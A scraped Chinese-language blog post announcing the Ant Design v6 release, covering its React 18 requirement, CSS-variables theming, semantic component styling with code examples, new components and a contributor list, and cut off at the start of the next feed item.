            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335924669/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zombieJ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:37:11.000Z" title="Mon Nov 24 2025 03:37:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>自开源以来，Ant Design 已收获 <strong>96.6K Star</strong>、累计 <strong>31.9K issue</strong>、<strong>20.7K PR</strong>、发布了 <strong>904 个 npm 版本</strong>，并有 <strong>2314 位贡献者</strong> 共同参与其中。这些数字不仅代表着社区的活跃度与支持，也见证了项目的不断进化与成熟。</p>
<p>正因为你们，Ant Design 才能不断成长，向下一站前行：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fant-design%2Fdiscussions%2F51919" target="_blank" title="https://github.com/ant-design/ant-design/discussions/51919" ref="nofollow noopener noreferrer">《Plan about Ant Design 6.0》</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d501f3ac2039489787fa9175f8ce94a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=gfXyCzjp1%2BXDPgJqPtSN0EKoF0k%3D" alt="Ant Design 6.0" loading="lazy"/></p>
<p>经过大量 RFC 讨论以及多个 Alpha 版本的迭代，v6 已进入稳定阶段。今天，我们宣布 Ant Design v6 正式发布！</p>
<p>本次升级以 <strong>技术侧深度优化</strong> 为重点，旨在为 React 19 以及未来版本提供更好的兼容与性能（版本兼容提升至 React 18），并进一步完善组件的语义化结构和 CSS 变量支持。</p>
<p>与 v5 不同，这次升级是 <strong>平滑版本迁移</strong>：</p>
<ul>
<li>如果你的项目已经运行在 v5，无需使用兼容包或 codemod 工具，即可直接升级到 v6。</li>
<li>v5 主分支将切换至 <code>v5.x-stable</code> 进入 <strong>1 年维护周期</strong>。
<ul>
<li>除非出现特别严重的 Bug，我们不会再对 v5 进行功能性更新。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">技术升级与核心变化</h2>
<h3 data-id="heading-2">⚛ React 最低版本要求提升至 18</h3>
<p>v6 支持版本从 React 18 起，移除了此版本之前的 React 兼容逻辑，避免了不同版本间的 API 行为差异。<br/>
我们仍然建议使用最新的 React 19 版本以获得最佳体验。</p>
<p>对于静态方法比如 <code>Modal.confirm</code>，你已经不需要额外的兼容代码或依赖，可直接移除相关兼容代码：</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-- import '@ant-design/v5-patch-for-react-19';</span>
</code></pre>
<h4 data-id="heading-3">📦 dist 开启 React Compiler</h4>
<p>在打包产物 <code>antd.js</code> 以及 <code>antd.min.js</code> 中启用了 <code>React Compiler</code> 以优化性能，对使用 CJS/ESM 场景的用户可自行选择开启，参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzh-hans.react.dev%2Flearn%2Freact-compiler" target="_blank" title="https://zh-hans.react.dev/learn/react-compiler" ref="nofollow noopener noreferrer">React 官方文档</a>。</p>
<h3 data-id="heading-4">🌈 纯 CSS Variables 样式架构</h3>
<p>随着 IE 支持的彻底移除，v6 中的 <code>@ant-design/cssinjs</code> 默认采用 <strong>纯 CSS Variables 模式</strong>：</p>
<ul>
<li>样式切换更轻量，支持实时主题变化。</li>
<li>多主题复用降低打包体积。</li>
<li>支持零运行时样式生成，可搭配 <code>@ant-design/static-style-extract</code>：</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">ConfigProvider</span> theme={{ <span class="hljs-attr">zeroRuntime</span>: <span class="hljs-literal">true</span> }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">ConfigProvider</span>&gt;
</code></pre>
<p>性能对比如下，zeroRuntime 模式表现最佳（水平轴为主题数量）：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4de97f05147748d0af7780584115173a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Rkh%2FsPRekDaDSAX1Y186myrzzHQ%3D" alt="Size" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73e8d833c4b349359a4a0776707c6007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=e7QbHETV9sqsRUnOm4irJm7psec%3D" alt="Speed" loading="lazy"/></p>
<p>你可以通过 <code>useToken</code> 获取完整变量名：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> {
    <span class="hljs-attr">cssVar</span>: { colorBgElevated },
  } = theme.<span class="hljs-title function_">useToken</span>();
};
</code></pre>
<h4 data-id="heading-5">🚫 不再支持 IE</h4>
<p>CSS Variables 模式彻底移除 IE 兼容的 StyleProvider。</p>
<h3 data-id="heading-6">🧩 全量组件语义化结构</h3>
<p>v6 完成了 <strong>所有组件</strong> 的 DOM 语义化改造：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a54f3d23bd74f3f8b269c116aa89d9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Ojzu3Xb78GSlzNTFgKuB41GwBOE%3D" alt="Semantic Structure" loading="lazy"/></p>
<ul>
<li>#52115</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ac32b5e154a4e63afde02aad6c50f68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Mjc0ByWR9ZeMrih4EBOI8VIRpVE%3D" alt="Semantic Render Props" loading="lazy"/></p>
<ul>
<li>#54995</li>
</ul>

<ul>
<li>API 使用逻辑位置描述（如 <code>start</code> / <code>end</code>），支持 RTL。</li>
<li>内部结构可用 ConfigProvider 的 <code>classNames</code> 和 <code>styles</code> 统一配置。
<ul>
<li>支持函数式动态生成语义结构：</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-attr">btnClassNames</span>: <span class="hljs-title class_">ButtonProps</span>[<span class="hljs-string">'classNames'</span>] = <span class="hljs-function">(<span class="hljs-params">{ props }</span>) =&gt;</span> {
  <span class="hljs-keyword">switch</span> (props.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'primary'</span>:
      <span class="hljs-keyword">return</span> { ... };
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> { ... };
  }
};

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">button</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">classNames:</span> <span class="hljs-attr">btnClassNames</span> }}&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-7">俏皮图标按钮</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Button</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">'rounded-tr-xl rounded-bl-xl'</span>,
    <span class="hljs-attr">icon</span>: <span class="hljs-string">'rotate-30'</span>,
  }}
  icon={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmileOutlined</span> /&gt;</span></span>}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span>
&lt;/<span class="hljs-title class_">Button</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0048cfdcc71c47deaa8d6813bb256a0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=kBJ4uC5EJRqwFymnEDJsuRufg2Y%3D" alt="Funny" loading="lazy"/></p>
<h4 data-id="heading-8">极客风卡片</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Card</span>
  title=<span class="hljs-string">"Hello World"</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">"bg-green-300/10 text-green-500 border-green-500 rounded-none [box-shadow:0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">header</span>: <span class="hljs-string">"rounded-none border-green-500 [box-shadow:inset_0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">title</span>:
      <span class="hljs-string">"text-green-500 [text-shadow:0_0_12px_theme(colors.green.400)] overflow-visible"</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-string">"rounded-none [text-shadow:0_0_8px_theme(colors.green.400)] [box-shadow:inset_0_0_12px_theme(colors.green.500)]"</span>
  }}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span> loves you!~ (=^・ω・^)
&lt;/<span class="hljs-title class_">Card</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c379d0325d8244a2a449dceac39ffb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=2%2FBVdMSUSor%2FPahE16xfFE7A8IM%3D" alt="Geek Green" loading="lazy"/></p>
<h3 data-id="heading-9">🚫 移除 v4 废弃 API</h3>
<p>v6 移除了在 v4 废弃、v5 保留兼容的所有 API：</p>
<ul>
<li><code>findDOMNode</code> 兼容逻辑移除。</li>
<li><strong>List</strong>、<strong>Dropdown.Button</strong>、<strong>BackTop</strong> 文档移除但保留兼容。</li>
<li>React 18 兼容代码删除（直接支持 18）。</li>
<li>统一 API 命名风格，兼容 v5 所有 API。</li>
</ul>
<h2 data-id="heading-10">新组件与功能增强</h2>
<h3 data-id="heading-11">🔥 Masonry 瀑布流组件</h3>
<p>用于图片展示、卡片流等场景：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422f1c5214648d4a5428eadaf324f51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=fZW0VVbxTyvTWTSx6FjBHB4vHUA%3D" alt="Masonry" loading="lazy"/></p>
<h3 data-id="heading-12">🔥 Tooltip 支持平移滑动</h3>
<p>在多个提示内容之间开启平移滑动：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e742cda3d834516b80ba9fc7c8f69cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=vVlXMk5e7nfEq3cr6J7CF0zjejM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">🆕 InputNumber <code>spinner</code> 模式</h3>
<p>常见的按钮平铺样式，便于用户直接点击交互：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c478906c3f1b40d5ab174a325fe62d01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=4ZGqSqtmjSqzKKeQeyJvr0%2BzjR0%3D" alt="Spinner InputNumber" loading="lazy"/></p>
<h3 data-id="heading-14">🆕 Drawer 支持拖拽</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a53e5d900542ebbae10b8a4e4b2ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GLSlQLCWes16xxt3aRNYXSCc5SM%3D" alt="Resizable Drawer" loading="lazy"/></p>
<h3 data-id="heading-15">🎨 蒙版模糊背景</h3>
<p>所有弹层默认使用模糊效果，可通过 <code>mask: { blur: false }</code> 关闭：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bfa07fa9a524614801832e7ebc7621b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Nv%2FYjwuFhll18o6nKHFs4BNswfg%3D" alt="Blur Mask" loading="lazy"/></p>
<h2 data-id="heading-16">升级指南</h2>
<ul>
<li>v6 对 v5 完全兼容，可直接升级。
<ul>
<li>建议按警告替换废弃 API。</li>
</ul>
</li>
<li>项目需运行在 <strong>React 18 或更高版本</strong>。</li>
<li>不再支持 <strong>IE</strong>。</li>
</ul>
<h2 data-id="heading-17">未来计划</h2>
<ul>
<li>优化移动端交互体验。</li>
<li>增强无障碍（Accessibility）支持。</li>
<li>跟进 React 新特性提升性能。</li>
<li>更多新组件开发中，敬请期待。</li>
</ul>
<h2 data-id="heading-18">One More Thing</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b789e7d0d6b4445b1887885f8a03fe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=zn8tZHe6EAVFgb27FaHQsIU9ddM%3D" alt="Ant Design X 2.0" loading="lazy"/></p>
<p>🚀 Ant Design X 同步发布 2.0 版本。作为 Ant Design 面向 AI 场景的组件库，新版本带来了更强大的交互与渲染能力。如果你正在探索 AI 驱动的界面体验，现在就是最佳时机：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fx%2Fissues%2F1358" target="_blank" title="https://github.com/ant-design/x/issues/1358" ref="nofollow noopener noreferrer">🎉 Ant Design X 2.0 正式发布了 🎉</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21e252f7d385437a9647cd0b8ab4e1f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GsfiWfHcXL0L1Ww8S1gUwNb1Xkk%3D" alt="LUI" loading="lazy"/></p>
<h2 data-id="heading-19">写在最后</h2>
<p>Ant Design 自第一行代码以来，经历了 10 个年头。我们希望在 AI 浪潮之下，Ant Design 仍然是你的最好伙伴。感谢为 v6 付出的各位朋友。 —— 因为你们的参与，开源才如此美好：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F984507092" target="_blank" title="https://github.com/984507092" ref="nofollow noopener noreferrer">984507092</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fafc163" target="_blank" title="https://github.com/afc163" ref="nofollow noopener noreferrer">afc163</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faojunhao123" target="_blank" title="https://github.com/aojunhao123" ref="nofollow noopener noreferrer">aojunhao123</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArktomson" target="_blank" title="https://github.com/Arktomson" ref="nofollow noopener noreferrer">Arktomson</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcactuser-Lu" target="_blank" title="https://github.com/cactuser-Lu" ref="nofollow noopener noreferrer">cactuser-Lu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fccc1018" target="_blank" title="https://github.com/ccc1018" ref="nofollow noopener noreferrer">ccc1018</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FcodewizardTM" target="_blank" title="https://github.com/codewizardTM" ref="nofollow noopener noreferrer">codewizardTM</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoding-ice" target="_blank" title="https://github.com/coding-ice" ref="nofollow noopener noreferrer">coding-ice</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrazyair" target="_blank" title="https://github.com/crazyair" ref="nofollow noopener noreferrer">crazyair</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdivyeshagrawal" target="_blank" title="https://github.com/divyeshagrawal" ref="nofollow noopener noreferrer">divyeshagrawal</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felrrrrrrr" target="_blank" title="https://github.com/elrrrrrrr" ref="nofollow noopener noreferrer">elrrrrrrr</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmilyyyLiu" target="_blank" title="https://github.com/EmilyyyLiu" ref="nofollow noopener noreferrer">EmilyyyLiu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffireairforce" target="_blank" title="https://github.com/fireairforce" ref="nofollow noopener noreferrer">fireairforce</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGinWU05" target="_blank" title="https://github.com/GinWU05" ref="nofollow noopener noreferrer">GinWU05</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fguoyunhe" target="_blank" title="https://github.com/guoyunhe" ref="nofollow noopener noreferrer">guoyunhe</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhcjlxl" target="_blank" title="https://github.com/hcjlxl" ref="nofollow noopener noreferrer">hcjlxl</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJeeekXY" target="_blank" title="https://github.com/JeeekXY" ref="nofollow noopener noreferrer">JeeekXY</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJerryqun" target="_blank" title="https://github.com/Jerryqun" ref="nofollow noopener noreferrer">Jerryqun</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjin19980928" target="_blank" title="https://github.com/jin19980928" ref="nofollow noopener noreferrer">jin19980928</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjon-cullison" target="_blank" title="https://github.com/jon-cullison" ref="nofollow noopener noreferrer">jon-cullison</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkiner-tang" target="_blank" title="https://github.com/kiner-tang" ref="nofollow noopener noreferrer">kiner-tang</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fli-jia-nan" target="_blank" title="https://github.com/li-jia-nan" ref="nofollow noopener noreferrer">li-jia-nan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLinkodt" target="_blank" title="https://github.com/Linkodt" ref="nofollow noopener noreferrer">Linkodt</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flovelts" target="_blank" title="https://github.com/lovelts" ref="nofollow noopener noreferrer">lovelts</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMadCcc" target="_blank" title="https://github.com/MadCcc" ref="nofollow noopener noreferrer">MadCcc</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeet-student" target="_blank" title="https://github.com/meet-student" ref="nofollow noopener noreferrer">meet-student</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnmsn" target="_blank" title="https://github.com/nmsn" ref="nofollow noopener noreferrer">nmsn</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOysterD3" target="_blank" title="https://github.com/OysterD3" ref="nofollow noopener noreferrer">OysterD3</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FPsiphonc" target="_blank" title="https://github.com/Psiphonc" ref="nofollow noopener noreferrer">Psiphonc</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSusuperli" target="_blank" title="https://github.com/Susuperli" ref="nofollow noopener noreferrer">Susuperli</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftanjiahao24" target="_blank" title="https://github.com/tanjiahao24" ref="nofollow noopener noreferrer">tanjiahao24</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fthinkasany" target="_blank" title="https://github.com/thinkasany" ref="nofollow noopener noreferrer">thinkasany</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fug-hero" target="_blank" title="https://github.com/ug-hero" ref="nofollow noopener noreferrer">ug-hero</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwanpan11" target="_blank" title="https://github.com/wanpan11" ref="nofollow noopener noreferrer">wanpan11</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWxh16144" target="_blank" title="https://github.com/Wxh16144" ref="nofollow noopener noreferrer">Wxh16144</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxkhanhan" target="_blank" title="https://github.com/xkhanhan" ref="nofollow noopener noreferrer">xkhanhan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyellowryan" target="_blank" title="https://github.com/yellowryan" ref="nofollow noopener noreferrer">yellowryan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyoyo837" target="_blank" title="https://github.com/yoyo837" ref="nofollow noopener noreferrer">yoyo837</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzjr222" target="_blank" title="https://github.com/zjr222" ref="nofollow noopener noreferrer">zjr222</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FzombieJ" target="_blank" title="https://github.com/zombieJ" ref="nofollow noopener noreferrer">zombieJ</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZyf665" target="_blank" title="https://github.com/Zyf665" ref="nofollow noopener noreferrer">Zyf665</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniapp 项目接入 sentry监控]]></title>    <link>https://juejin.cn/post/7575937594350845995</link>    <guid>https://juejin.cn/post/7575937594350845995</guid>    <pubDate>2025-11-24T05:03:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350845995" data-draft-id="7575937594350829611" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniapp 项目接入 sentry监控"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T05:03:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="半瓶神仙醋"/> <meta itemprop="url" 